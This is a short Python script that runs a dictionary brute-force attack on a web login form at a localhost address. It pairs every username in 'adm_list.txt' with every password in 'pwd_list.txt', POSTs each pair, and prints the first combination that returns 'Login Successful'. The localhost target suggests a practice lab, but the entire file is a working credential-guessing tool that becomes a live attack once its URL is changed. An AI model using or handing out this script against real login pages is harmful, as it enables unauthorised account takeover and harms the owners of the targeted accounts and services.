import requests
import time

url = "http://127.0.0.1:5000/login"

attempts = 0

with open("adm_list.txt") as users:
    for user in users:
        username = user.strip()

        with open("pwd_list.txt") as passwords:
            for pwd in passwords:
                password = pwd.strip()
                attempts += 1

                data = {
                    "username": username,
                    "password": password
                }

                response = requests.post(url, data=data)

                print(f"[{attempts}] Trying -> {username}:{password}")

                time.sleep(0.1)

                if "Login Successful" in response.text:
                    print("\n🔥 SUCCESS 🔥")
                    print(f"{username}:{password}")
                    print(f"Attempts: {attempts}")
                    exit()

print("\n❌ No valid credentials found")